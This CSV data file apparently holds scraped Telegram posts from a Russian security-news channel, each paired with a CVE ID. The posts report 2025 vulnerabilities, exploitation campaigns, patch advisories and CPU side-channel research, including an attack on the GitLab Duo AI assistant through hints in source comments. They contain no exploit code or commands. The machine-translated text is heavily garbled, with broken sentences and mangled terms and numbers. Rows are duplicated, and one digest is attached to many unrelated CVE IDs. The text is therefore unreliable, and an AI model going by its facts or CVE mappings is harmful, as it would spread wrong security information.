id,cve_id,channel_name,message,timestamp,message_url
171,CVE-2025-36535,true_secator,"We continue to track the most trendy vulnerabilities and threats associated with them. In the new selection: 1. PentestPartners found (bypass limited viewing and consider secure files stored on Microsoft SharePoint servers, including the fraud of agent AI. 2. Researchers Project Discovery (three vulnerability in the Versa Converto orchestration platform, which can be combined in The chain of the CONCERTO copies - bypassing the authentication with an assessment of the seriousness of 10/10. Hints in the comments of the source code and attack the Gitlab Duo AI assistant to steal the source code or perform other malicious actions. UNC5221, which previously also attacked the Palo Alto Networks and SAP devices for the deployment of the Krustyloader and Sliver beacons. 8COM published (CVE-2025-26817, vulnerabilities RCE after authentication in Netwrix Password Secure, corporate password manager. 8. Developers of the authentication library Samlify node.js issued corrections to eliminate the packaging of subscriptions that could be used to use for Bypassing the authentication of SAML SSO (9. CISA warns the companies about a large -scale campaign aimed at using the vulnerability of CommVault to hack the Azure. Commvault corrected the error at the end of February, but in early May (recommendations, warning that attackers could gain access to the permits of the accounting data of applications, which are some Customers of ComVault are used to authentically have their Mr. 10. More than 100 AutomationDirect MB-GateWay devices can be used by Modbus, including in a critically important infrastructure. Vulnerability in Bamboo, Confluence, Fisheye/Crucible and Jira. The seriousness that authenticated attackers can use to call the DOS state. Cisco has also published Unified Intelligence Center-CVE-2025-20152 and CVE-2025-20113.",2025-06-01 01:36:00.641403,https://t.me/true_secator/7066
172,CVE-2025-32756,true_secator,"We continue to track the most trendy vulnerabilities and threats associated with them. In the new selection: 1. PentestPartners found (bypass limited viewing and consider secure files stored on Microsoft SharePoint servers, including the fraud of agent AI. 2. Researchers Project Discovery (three vulnerability in the Versa Converto orchestration platform, which can be combined in The chain of the CONCERTO copies - bypassing the authentication with an assessment of the seriousness of 10/10. Hints in the comments of the source code and attack the Gitlab Duo AI assistant to steal the source code or perform other malicious actions. UNC5221, which previously also attacked the Palo Alto Networks and SAP devices for the deployment of the Krustyloader and Sliver beacons. 8COM published (CVE-2025-26817, vulnerabilities RCE after authentication in Netwrix Password Secure, corporate password manager. 8. Developers of the authentication library Samlify node.js issued corrections to eliminate the packaging of subscriptions that could be used to use for Bypassing the authentication of SAML SSO (9. CISA warns the companies about a large -scale campaign aimed at using the vulnerability of CommVault to hack the Azure. Commvault corrected the error at the end of February, but in early May (recommendations, warning that attackers could gain access to the permits of the accounting data of applications, which are some Customers of ComVault are used to authentically have their Mr. 10. More than 100 AutomationDirect MB-GateWay devices can be used by Modbus, including in a critically important infrastructure. Vulnerability in Bamboo, Confluence, Fisheye/Crucible and Jira. The seriousness that authenticated attackers can use to call the DOS state. Cisco has also published Unified Intelligence Center-CVE-2025-20152 and CVE-2025-20113.",2025-06-01 01:36:00.641410,https://t.me/true_secator/7066
173,CVE-2025-47949,true_secator,"We continue to track the most trendy vulnerabilities and threats associated with them. In the new selection: 1. PentestPartners found (bypass limited viewing and consider secure files stored on Microsoft SharePoint servers, including the fraud of agent AI. 2. Researchers Project Discovery (three vulnerability in the Versa Converto orchestration platform, which can be combined in The chain of the CONCERTO copies - bypassing the authentication with an assessment of the seriousness of 10/10. Hints in the comments of the source code and attack the Gitlab Duo AI assistant to steal the source code or perform other malicious actions. UNC5221, which previously also attacked the Palo Alto Networks and SAP devices for the deployment of the Krustyloader and Sliver beacons. 8COM published (CVE-2025-26817, vulnerabilities RCE after authentication in Netwrix Password Secure, corporate password manager. 8. Developers of the authentication library Samlify node.js issued corrections to eliminate the packaging of subscriptions that could be used to use for Bypassing the authentication of SAML SSO (9. CISA warns the companies about a large -scale campaign aimed at using the vulnerability of CommVault to hack the Azure. Commvault corrected the error at the end of February, but in early May (recommendations, warning that attackers could gain access to the permits of the accounting data of applications, which are some Customers of ComVault are used to authentically have their Mr. 10. More than 100 AutomationDirect MB-GateWay devices can be used by Modbus, including in a critically important infrastructure. Vulnerability in Bamboo, Confluence, Fisheye/Crucible and Jira. The seriousness that authenticated attackers can use to call the DOS state. Cisco has also published Unified Intelligence Center-CVE-2025-20152 and CVE-2025-20113.",2025-06-01 01:36:00.641417,https://t.me/true_secator/7066
174,CVE-2025-26147,true_secator,"We continue to track the most trendy vulnerabilities and threats associated with them. In the new selection: 1. PentestPartners found (bypass limited viewing and consider secure files stored on Microsoft SharePoint servers, including the fraud of agent AI. 2. Researchers Project Discovery (three vulnerability in the Versa Converto orchestration platform, which can be combined in The chain of the CONCERTO copies - bypassing the authentication with an assessment of the seriousness of 10/10. Hints in the comments of the source code and attack the Gitlab Duo AI assistant to steal the source code or perform other malicious actions. UNC5221, which previously also attacked the Palo Alto Networks and SAP devices for the deployment of the Krustyloader and Sliver beacons. 8COM published (CVE-2025-26817, vulnerabilities RCE after authentication in Netwrix Password Secure, corporate password manager. 8. Developers of the authentication library Samlify node.js issued corrections to eliminate the packaging of subscriptions that could be used to use for Bypassing the authentication of SAML SSO (9. CISA warns the companies about a large -scale campaign aimed at using the vulnerability of CommVault to hack the Azure. Commvault corrected the error at the end of February, but in early May (recommendations, warning that attackers could gain access to the permits of the accounting data of applications, which are some Customers of ComVault are used to authentically have their Mr. 10. More than 100 AutomationDirect MB-GateWay devices can be used by Modbus, including in a critically important infrastructure. Vulnerability in Bamboo, Confluence, Fisheye/Crucible and Jira. The seriousness that authenticated attackers can use to call the DOS state. Cisco has also published Unified Intelligence Center-CVE-2025-20152 and CVE-2025-20113.",2025-06-01 01:36:00.641424,https://t.me/true_secator/7066
175,CVE-2025-26817,true_secator,"We continue to track the most trendy vulnerabilities and threats associated with them. In the new selection: 1. PentestPartners found (bypass limited viewing and consider secure files stored on Microsoft SharePoint servers, including the fraud of agent AI. 2. Researchers Project Discovery (three vulnerability in the Versa Converto orchestration platform, which can be combined in The chain of the CONCERTO copies - bypassing the authentication with an assessment of the seriousness of 10/10. Hints in the comments of the source code and attack the Gitlab Duo AI assistant to steal the source code or perform other malicious actions. UNC5221, which previously also attacked the Palo Alto Networks and SAP devices for the deployment of the Krustyloader and Sliver beacons. 8COM published (CVE-2025-26817, vulnerabilities RCE after authentication in Netwrix Password Secure, corporate password manager. 8. Developers of the authentication library Samlify node.js issued corrections to eliminate the packaging of subscriptions that could be used to use for Bypassing the authentication of SAML SSO (9. CISA warns the companies about a large -scale campaign aimed at using the vulnerability of CommVault to hack the Azure. Commvault corrected the error at the end of February, but in early May (recommendations, warning that attackers could gain access to the permits of the accounting data of applications, which are some Customers of ComVault are used to authentically have their Mr. 10. More than 100 AutomationDirect MB-GateWay devices can be used by Modbus, including in a critically important infrastructure. Vulnerability in Bamboo, Confluence, Fisheye/Crucible and Jira. The seriousness that authenticated attackers can use to call the DOS state. Cisco has also published Unified Intelligence Center-CVE-2025-20152 and CVE-2025-20113.",2025-06-01 01:36:00.641431,https://t.me/true_secator/7066
176,CVE-2025-4427,true_secator,"We continue to track the most trendy vulnerabilities and threats associated with them. In the new selection: 1. PentestPartners found (bypass limited viewing and consider secure files stored on Microsoft SharePoint servers, including the fraud of agent AI. 2. Researchers Project Discovery (three vulnerability in the Versa Converto orchestration platform, which can be combined in The chain of the CONCERTO copies - bypassing the authentication with an assessment of the seriousness of 10/10. Hints in the comments of the source code and attack the Gitlab Duo AI assistant to steal the source code or perform other malicious actions. UNC5221, which previously also attacked the Palo Alto Networks and SAP devices for the deployment of the Krustyloader and Sliver beacons. 8COM published (CVE-2025-26817, vulnerabilities RCE after authentication in Netwrix Password Secure, corporate password manager. 8. Developers of the authentication library Samlify node.js issued corrections to eliminate the packaging of subscriptions that could be used to use for Bypassing the authentication of SAML SSO (9. CISA warns the companies about a large -scale campaign aimed at using the vulnerability of CommVault to hack the Azure. Commvault corrected the error at the end of February, but in early May (recommendations, warning that attackers could gain access to the permits of the accounting data of applications, which are some Customers of ComVault are used to authentically have their Mr. 10. More than 100 AutomationDirect MB-GateWay devices can be used by Modbus, including in a critically important infrastructure. Vulnerability in Bamboo, Confluence, Fisheye/Crucible and Jira. The seriousness that authenticated attackers can use to call the DOS state. Cisco has also published Unified Intelligence Center-CVE-2025-20152 and CVE-2025-20113.",2025-06-01 01:36:00.641438,https://t.me/true_secator/7066
177,CVE-2025-34027,true_secator,"We continue to track the most trendy vulnerabilities and threats associated with them. In the new selection: 1. PentestPartners found (bypass limited viewing and consider secure files stored on Microsoft SharePoint servers, including the fraud of agent AI. 2. Researchers Project Discovery (three vulnerability in the Versa Converto orchestration platform, which can be combined in The chain of the CONCERTO copies - bypassing the authentication with an assessment of the seriousness of 10/10. Hints in the comments of the source code and attack the Gitlab Duo AI assistant to steal the source code or perform other malicious actions. UNC5221, which previously also attacked the Palo Alto Networks and SAP devices for the deployment of the Krustyloader and Sliver beacons. 8COM published (CVE-2025-26817, vulnerabilities RCE after authentication in Netwrix Password Secure, corporate password manager. 8. Developers of the authentication library Samlify node.js issued corrections to eliminate the packaging of subscriptions that could be used to use for Bypassing the authentication of SAML SSO (9. CISA warns the companies about a large -scale campaign aimed at using the vulnerability of CommVault to hack the Azure. Commvault corrected the error at the end of February, but in early May (recommendations, warning that attackers could gain access to the permits of the accounting data of applications, which are some Customers of ComVault are used to authentically have their Mr. 10. More than 100 AutomationDirect MB-GateWay devices can be used by Modbus, including in a critically important infrastructure. Vulnerability in Bamboo, Confluence, Fisheye/Crucible and Jira. The seriousness that authenticated attackers can use to call the DOS state. Cisco has also published Unified Intelligence Center-CVE-2025-20152 and CVE-2025-20113.",2025-06-01 01:36:00.641445,https://t.me/true_secator/7066
178,CVE-2025-26817,true_secator,"We continue to track the most trendy vulnerabilities and threats associated with them. In the new selection: 1. PentestPartners found (bypass limited viewing and consider secure files stored on Microsoft SharePoint servers, including the fraud of agent AI. 2. Researchers Project Discovery (three vulnerability in the Versa Converto orchestration platform, which can be combined in The chain of the CONCERTO copies - bypassing the authentication with an assessment of the seriousness of 10/10. Hints in the comments of the source code and attack the Gitlab Duo AI assistant to steal the source code or perform other malicious actions. UNC5221, which previously also attacked the Palo Alto Networks and SAP devices for the deployment of the Krustyloader and Sliver beacons. 8COM published (CVE-2025-26817, vulnerabilities RCE after authentication in Netwrix Password Secure, corporate password manager. 8. Developers of the authentication library Samlify node.js issued corrections to eliminate the packaging of subscriptions that could be used to use for Bypassing the authentication of SAML SSO (9. CISA warns the companies about a large -scale campaign aimed at using the vulnerability of CommVault to hack the Azure. Commvault corrected the error at the end of February, but in early May (recommendations, warning that attackers could gain access to the permits of the accounting data of applications, which are some Customers of ComVault are used to authentically have their Mr. 10. More than 100 AutomationDirect MB-GateWay devices can be used by Modbus, including in a critically important infrastructure. Vulnerability in Bamboo, Confluence, Fisheye/Crucible and Jira. The seriousness that authenticated attackers can use to call the DOS state. Cisco has also published Unified Intelligence Center-CVE-2025-20152 and CVE-2025-20113.",2025-06-01 01:36:00.641452,https://t.me/true_secator/7066
179,CVE-2025-0994,true_secator,"Researchers of Cisco Talos (the involvement of the Chinese APT, which they track as the UAT-6382, in attacks on local authorities in the United States using 0-Day in Trimble CityWorks. CVE-2025-0994 was fixed at the end Microsoft Internet Information Services Web CityWorks is a GIS-oriented solution that is used at critically important facilities, including local authorities and utilities, for contrastructure for CISA, in February, the CVE-2025-094 in its catalog to its catalog. KEV issued a recommendation for industrial management systems, noting that the operation of this error requires authentication. For the observed attacks, the Cisco Talos researchers have attributed to the Chinese UAT-6382, which has been operating 0-day since January 2025, aiming at the corporate networks of local authorities in the United States. Malicious software for stability, as well as in attempts to penetrate the systems of communal services. We used several bacdors through the PowerShell. The screen of the screen and the installation of a proxy server.",2025-06-01 01:36:00.641854,https://t.me/true_secator/7065
180,CVE-2017-11882,true_secator,"Acronis researchers (about the new campaign (about the new Camobes of which are the highest government institutions of Sri Lanka, Bangladesh and Pakistan. Attackers used phishing letters in combination with geozonated useful loads, ensuring the implementation of malicious content exclusively victims in certain countries. The attack chains used to have phishing bait as The starting point for activating the process of infection and the famous malicious software - Stealerbot. The Ministry of Finance and the Directorate of the Technical Development of Pakistan, the Department of External Resources, the Treasury, the Ministry of Defense and the Central Bank of the Sri Lanka are characterized by the use of perennial RCE-vast in Microsoft Office as the initial vectors for the deployment of harmful access in governmental access for government environments The whole of South Asia, when the malicious documents are opened, the exploit for the CVE-2017-0199 is activated, which delivers the useful loads of the next stage, responsible for installing the Stealerbot using DLL-Biblioteka loading methods. guaranteeing the appropriate targeting criteria if the IP address of the victim does not coincide, the RTF is sent instead of it as a bait. Which launches the malicious Stealerbot Sustainable activity for a long time, maintaining a stable pace of work without prolonged inaction - a model that reflects organizational continuity and sustainable intentions.",2025-06-01 01:36:00.644474,https://t.me/true_secator/7059
181,CVE-2017-0199,true_secator,"Acronis researchers (about the new campaign (about the new Camobes of which are the highest government institutions of Sri Lanka, Bangladesh and Pakistan. Attackers used phishing letters in combination with geozonated useful loads, ensuring the implementation of malicious content exclusively victims in certain countries. The attack chains used to have phishing bait as The starting point for activating the process of infection and the famous malicious software - Stealerbot. The Ministry of Finance and the Directorate of the Technical Development of Pakistan, the Department of External Resources, the Treasury, the Ministry of Defense and the Central Bank of the Sri Lanka are characterized by the use of perennial RCE-vast in Microsoft Office as the initial vectors for the deployment of harmful access in governmental access for government environments The whole of South Asia, when the malicious documents are opened, the exploit for the CVE-2017-0199 is activated, which delivers the useful loads of the next stage, responsible for installing the Stealerbot using DLL-Biblioteka loading methods. guaranteeing the appropriate targeting criteria if the IP address of the victim does not coincide, the RTF is sent instead of it as a bait. Which launches the malicious Stealerbot Sustainable activity for a long time, maintaining a stable pace of work without prolonged inaction - a model that reflects organizational continuity and sustainable intentions.",2025-06-01 01:36:00.644488,https://t.me/true_secator/7059
182,CVE-2025-4428,true_secator,"The Ivanti multi -episode series continues in the new series in the main role - Wiz researchers, who reaminated the active operation of two recently corrected Endpoint Manager Mobile vulnerabilities. CVE-2025-4427 and CVE-2025-4428 are associated with the bypass of authentication and RCE after authentication and have an average level of seriousness. They were found in two open source libraries integrated into EPMM. Ivanti issued corrections for both errors on May 13, warning about the operation of the 40-day in relation to a limited number of customers and noting a reduction in the risk of compromise, if the ACL functionality on the portal or external WAF is used to filter access to the API. In turn, Wiz (that bypassing authentication arises in view of the fact that EPMM configuration does not process requests properly, opening routes without authentication due to the missing rules in the safety configuration of the RCE Framwar. The attacker allows the attacker to create a format parameter and executed Java code. Unautotified RCE. PALO Networks, which operate Pan-Sos, it seems that the IP is still used by an attacker, since its certificate has not changed since November 2024. Ivanti EPMM to one of the corrected versions, including 11.12.0.5, 12.3.0.2, 12.4.0.2 and 12.5.0.1.",2025-06-01 01:36:00.646008,https://t.me/true_secator/7055
183,CVE-2025-4427,true_secator,"The Ivanti multi -episode series continues in the new series in the main role - Wiz researchers, who reaminated the active operation of two recently corrected Endpoint Manager Mobile vulnerabilities. CVE-2025-4427 and CVE-2025-4428 are associated with the bypass of authentication and RCE after authentication and have an average level of seriousness. They were found in two open source libraries integrated into EPMM. Ivanti issued corrections for both errors on May 13, warning about the operation of the 40-day in relation to a limited number of customers and noting a reduction in the risk of compromise, if the ACL functionality on the portal or external WAF is used to filter access to the API. In turn, Wiz (that bypassing authentication arises in view of the fact that EPMM configuration does not process requests properly, opening routes without authentication due to the missing rules in the safety configuration of the RCE Framwar. The attacker allows the attacker to create a format parameter and executed Java code. Unautotified RCE. PALO Networks, which operate Pan-Sos, it seems that the IP is still used by an attacker, since its certificate has not changed since November 2024. Ivanti EPMM to one of the corrected versions, including 11.12.0.5, 12.3.0.2, 12.4.0.2 and 12.5.0.1.",2025-06-01 01:36:00.646020,https://t.me/true_secator/7055
184,CVE-2025-4428,true_secator,"The Ivanti multi -episode series continues in the new series in the main role - Wiz researchers, who reaminated the active operation of two recently corrected Endpoint Manager Mobile vulnerabilities. CVE-2025-4427 and CVE-2025-4428 are associated with the bypass of authentication and RCE after authentication and have an average level of seriousness. They were found in two open source libraries integrated into EPMM. Ivanti issued corrections for both errors on May 13, warning about the operation of the 40-day in relation to a limited number of customers and noting a reduction in the risk of compromise, if the ACL functionality on the portal or external WAF is used to filter access to the API. In turn, Wiz (that bypassing authentication arises in view of the fact that EPMM configuration does not process requests properly, opening routes without authentication due to the missing rules in the safety configuration of the RCE Framwar. The attacker allows the attacker to create a format parameter and executed Java code. Unautotified RCE. PALO Networks, which operate Pan-Sos, it seems that the IP is still used by an attacker, since its certificate has not changed since November 2024. Ivanti EPMM to one of the corrected versions, including 11.12.0.5, 12.3.0.2, 12.4.0.2 and 12.5.0.1.",2025-06-01 01:36:00.646026,https://t.me/true_secator/7055
185,CVE-2025-4427,true_secator,"The Ivanti multi -episode series continues in the new series in the main role - Wiz researchers, who reaminated the active operation of two recently corrected Endpoint Manager Mobile vulnerabilities. CVE-2025-4427 and CVE-2025-4428 are associated with the bypass of authentication and RCE after authentication and have an average level of seriousness. They were found in two open source libraries integrated into EPMM. Ivanti issued corrections for both errors on May 13, warning about the operation of the 40-day in relation to a limited number of customers and noting a reduction in the risk of compromise, if the ACL functionality on the portal or external WAF is used to filter access to the API. In turn, Wiz (that bypassing authentication arises in view of the fact that EPMM configuration does not process requests properly, opening routes without authentication due to the missing rules in the safety configuration of the RCE Framwar. The attacker allows the attacker to create a format parameter and executed Java code. Unautotified RCE. PALO Networks, which operate Pan-Sos, it seems that the IP is still used by an attacker, since its certificate has not changed since November 2024. Ivanti EPMM to one of the corrected versions, including 11.12.0.5, 12.3.0.2, 12.4.0.2 and 12.5.0.1.",2025-06-01 01:36:00.646032,https://t.me/true_secator/7055
186,CVE-2025-4919,true_secator,"Firefox eliminates the two critical vulnerabilities of JavaScript, detected on the Pwn2own Berlin 2025 Mozilla (for the browser (and its ESR versions, eliminating two critical vulnerabilities demonstrated during the PWN2own contest (2025. Both vulnerabilities affected object processing JavaScript in the process of displaying content, but, thanks to the architecture of the sandbox, did not allow the attackers to go beyond the isolated environment. Reading and entry outside the selected memory when resolving Promise objects in JavaScript, which could potentially lead to execution (code during the browser content. The second vulnerability, CVE-2025-4919 was represented by manfrede and is associated with the confusion of the size of the array indexes in the optimization of linear sums, as well as leading outside the memory of both vulnerabilities. Safety updates during the demonstration of vulnerabilities, despite the fact that vulnerabilities did not allow the attackers to go beyond the content process thanks to (the sandbox Firefox, Mozilla strongly recommends that all users upheld the last versions as possible to ensure the maximum safety of their browsers.",2025-06-01 01:36:00.646975,https://t.me/true_secator/7052
187,CVE-2025-4918,true_secator,"Firefox eliminates the two critical vulnerabilities of JavaScript, detected on the Pwn2own Berlin 2025 Mozilla (for the browser (and its ESR versions, eliminating two critical vulnerabilities demonstrated during the PWN2own contest (2025. Both vulnerabilities affected object processing JavaScript in the process of displaying content, but, thanks to the architecture of the sandbox, did not allow the attackers to go beyond the isolated environment. Reading and entry outside the selected memory when resolving Promise objects in JavaScript, which could potentially lead to execution (code during the browser content. The second vulnerability, CVE-2025-4919 was represented by manfrede and is associated with the confusion of the size of the array indexes in the optimization of linear sums, as well as leading outside the memory of both vulnerabilities. Safety updates during the demonstration of vulnerabilities, despite the fact that vulnerabilities did not allow the attackers to go beyond the content process thanks to (the sandbox Firefox, Mozilla strongly recommends that all users upheld the last versions as possible to ensure the maximum safety of their browsers.",2025-06-01 01:36:00.646986,https://t.me/true_secator/7052
188,CVE-2025-47729,true_secator,"Ddoserets announced (for researchers and journalists to a database of 410 GB, including correspondence and metadata TELEMESSAGE users, which appeared in a recent scandal with the US National Bester Mikek Waltz. A company owned by Smarsh, a Portland developer, implements software for applications, ORDOMENTS OF THE SIGNAL and WhatsApp, including Signal, is called TM Signl. Persons, the application used Signal servers and saved copies of the simple text for greater ease of working with the DDOSERTS archive all the text data, including the information about the sender and recipients, the company provides access to data from the data of personally identified information, “and also also The inclusion of groups and messages that are not related to the activities of the government or corporations. ” Jeffrey Goldberg in the Signal Secret Group Chat, where senior officials discussed the upcoming US strokes on the targets of the Khusitov in Yemen on March 15, according to the media sources, the attacker took advantage of the TELEMESSAGE It took less than 20 minutes the next day (the source code of TM SGNL, ​​as well as some hacking data, showed that Telemessage contrary to his statements about through encryption, and unlike the original Signal, in reality did not have such a functionality. Telemessage, CVE-2025-47729, in the KEV catalog, arguing that the Archival Bacand of Telemessage as of May 5, 2025 kept open text copies of the users of the TM SGNL application, which does not correspond to the entirely documentation, Signalgate only gains revolutions. There are new more scandalous information breeders.",2025-06-01 01:36:00.648652,https://t.me/true_secator/7047
189,CVE-2025-32433,true_secator,"Giants of the promastation of Siemens, Schneider Electric and Phoenix Contact presented their recommendations as part of the ICS Patch Tuesday for May 2025. Most of the described vulnerabilities have been corrected, but for some disadvantages, only measures to mitigate the consequences and bypass areas are currently available. Siemens (18 new recommendations, including four that cover critical vulnerabilities. One of them describes the problem of bypassing authentication in the Redfish interface of the BMC controller used by the industrial PC Simatic. The disadvantage was disclosed by Eclypsium back in March. Another critical Bulletin includes the deficiency of the OZW web server, which is the deficiency of OZW, which is defined. You can use ROOT for RCE, and another mistake that can be used to obtain administrator’s privileges. Blastradius, in particular, describing its influence on Siprotec, Sicam and other products. TeamCenter Visualization. Dedicated to the influence of the CVE-2023-4041, the older drawing of the Silicon Labs Gecko bootloader, the PrismAset Active and Wiser home automation products, the effect of CVE-2025-32433 is described in the recently opened errors of Erlang/OTP SSH, which subjects many devices to many devices full Schneider has determined that the Galaxy Data Center UPS has a vulnerability. In the last Schneider message, the vulnerability of the disclosure of highly seriousness, which can use an unauthorized attacker for reading arbitrary files in the PLC Modicon Contact (customers that some of its tire connectors are prone to DOS-vast se seres that was detected during the network scanning. A non-assigned attacker can remotely use security vulnerability to cause a large number of requests to port 80.",2025-06-01 01:36:00.650667,https://t.me/true_secator/7040
190,CVE-2023-4041,true_secator,"Giants of the promastation of Siemens, Schneider Electric and Phoenix Contact presented their recommendations as part of the ICS Patch Tuesday for May 2025. Most of the described vulnerabilities have been corrected, but for some disadvantages, only measures to mitigate the consequences and bypass areas are currently available. Siemens (18 new recommendations, including four that cover critical vulnerabilities. One of them describes the problem of bypassing authentication in the Redfish interface of the BMC controller used by the industrial PC Simatic. The disadvantage was disclosed by Eclypsium back in March. Another critical Bulletin includes the deficiency of the OZW web server, which is the deficiency of OZW, which is defined. You can use ROOT for RCE, and another mistake that can be used to obtain administrator’s privileges. Blastradius, in particular, describing its influence on Siprotec, Sicam and other products. TeamCenter Visualization. Dedicated to the influence of the CVE-2023-4041, the older drawing of the Silicon Labs Gecko bootloader, the PrismAset Active and Wiser home automation products, the effect of CVE-2025-32433 is described in the recently opened errors of Erlang/OTP SSH, which subjects many devices to many devices full Schneider has determined that the Galaxy Data Center UPS has a vulnerability. In the last Schneider message, the vulnerability of the disclosure of highly seriousness, which can use an unauthorized attacker for reading arbitrary files in the PLC Modicon Contact (customers that some of its tire connectors are prone to DOS-vast se seres that was detected during the network scanning. A non-assigned attacker can remotely use security vulnerability to cause a large number of requests to port 80.",2025-06-01 01:36:00.650696,https://t.me/true_secator/7040
191,CVE-2025-24495,true_secator,"Intel, AMD and ARM presented their safety recommendations within the framework of Patch Tuesday, informing customers about recently discovered vulnerabilities in their products, including recently opened attacks on processors. One of these was disclosed the week by researchers of the Swiss University of Eth Zurich, who found the problem of introducing branches of branching, which implements the entire power of attacks for the introduction of the target on Intel. Researchers argue that although Intel SPECTRE-BTI protects for almost six years, now they managed to find a way to circumvent them due to the state of the race that affects Intel processors. Pectre attacks allow an attacker who has access to the target system to get potentially valuable information from memory, including encryption and passwords. In her (Intel noted that she produces updates to the microcode to soften the vulnerabilities of the CVE-2024-45332, which she attributed to the problem of disclosing confidential information. AMD published a warning for customers that, as the researchers themselves, this vulnerability does not affect its processors. Another attack on the CPU was disclosed by the researchers from the same week by researchers from Dutch University of VU AMSTERDAM, which called it (opening three new classes of self -learning attacks by Specter V2, which emphasize the restrictions of domain insulation. Researchers developed two exploits aimed at Intel processors, which lead to a leakage of the nucleus at a speed of up to 17 kbps, and found two new hardware vulneys (and which completely violate (which completely violate Domen isolation of the spaces for traditional attacks by SPECTRE-V2 “user-user”, “Guest” and even “Guest-HOST”. ARM processors. Platform, Graphics and Graphics Driver, Server Board, Proset/Wireless, Gaudi, Xeon, Ethernet Network Adapter, Slim Bootloader and Simics Paccage Manager. In Intel Realsense, Ethernet Network Adapter, Ethernet Conneptions Boot Utility, Oneapi Level Zero, Openvino, Advisor, Endurance Gaming Mode, Arc GPU, Core and Xeon CPU, Oneapi DPC ++/C ++ Compiler and Quickassist Technology. Vulnerabilities of highly seriousness in the AMD Optimizing CPU Libraries libraries, which can also be used for EOP and, possibly, RCE.",2025-06-01 01:36:00.652274,https://t.me/true_secator/7036
192,CVE-2024-28956,true_secator,"Intel, AMD and ARM presented their safety recommendations within the framework of Patch Tuesday, informing customers about recently discovered vulnerabilities in their products, including recently opened attacks on processors. One of these was disclosed the week by researchers of the Swiss University of Eth Zurich, who found the problem of introducing branches of branching, which implements the entire power of attacks for the introduction of the target on Intel. Researchers argue that although Intel SPECTRE-BTI protects for almost six years, now they managed to find a way to circumvent them due to the state of the race that affects Intel processors. Pectre attacks allow an attacker who has access to the target system to get potentially valuable information from memory, including encryption and passwords. In her (Intel noted that she produces updates to the microcode to soften the vulnerabilities of the CVE-2024-45332, which she attributed to the problem of disclosing confidential information. AMD published a warning for customers that, as the researchers themselves, this vulnerability does not affect its processors. Another attack on the CPU was disclosed by the researchers from the same week by researchers from Dutch University of VU AMSTERDAM, which called it (opening three new classes of self -learning attacks by Specter V2, which emphasize the restrictions of domain insulation. Researchers developed two exploits aimed at Intel processors, which lead to a leakage of the nucleus at a speed of up to 17 kbps, and found two new hardware vulneys (and which completely violate (which completely violate Domen isolation of the spaces for traditional attacks by SPECTRE-V2 “user-user”, “Guest” and even “Guest-HOST”. ARM processors. Platform, Graphics and Graphics Driver, Server Board, Proset/Wireless, Gaudi, Xeon, Ethernet Network Adapter, Slim Bootloader and Simics Paccage Manager. In Intel Realsense, Ethernet Network Adapter, Ethernet Conneptions Boot Utility, Oneapi Level Zero, Openvino, Advisor, Endurance Gaming Mode, Arc GPU, Core and Xeon CPU, Oneapi DPC ++/C ++ Compiler and Quickassist Technology. Vulnerabilities of highly seriousness in the AMD Optimizing CPU Libraries libraries, which can also be used for EOP and, possibly, RCE.",2025-06-01 01:36:00.652292,https://t.me/true_secator/7036
